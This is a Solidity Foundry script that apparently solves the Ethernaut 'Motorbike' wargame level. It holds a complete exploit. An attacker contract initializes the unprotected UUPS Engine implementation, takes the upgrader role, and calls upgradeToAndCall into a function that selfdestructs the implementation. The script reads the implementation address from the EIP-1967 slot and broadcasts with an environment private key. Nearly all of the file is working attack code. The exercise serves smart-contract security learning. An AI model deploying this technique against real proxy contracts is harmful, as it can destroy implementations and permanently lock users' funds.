// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "../src/Motorbike.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    Engine engineInstance;

    constructor (address _address) public {
        engineInstance = Engine(_address);
    }

    function attack() public {
        engineInstance.initialize();
        engineInstance.upgradeToAndCall(address(this), abi.encodeWithSignature("killed()"));
    }

    function killed() external {
        selfdestruct(address(0));
    }
}

contract MotorbikeSolution is Script {
    Motorbike public motorbike = Motorbike(0x6320096178278Da88e4830d8bA9FAB3cf9975008);
    Engine public engine = Engine((uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));

        AttackerContract attackerContract = new AttackerContract(address(engine));

        attackerContract.attack();

        console.log("After killed : ", engine.upgrader());

        vm.stopBroadcast();
    }
}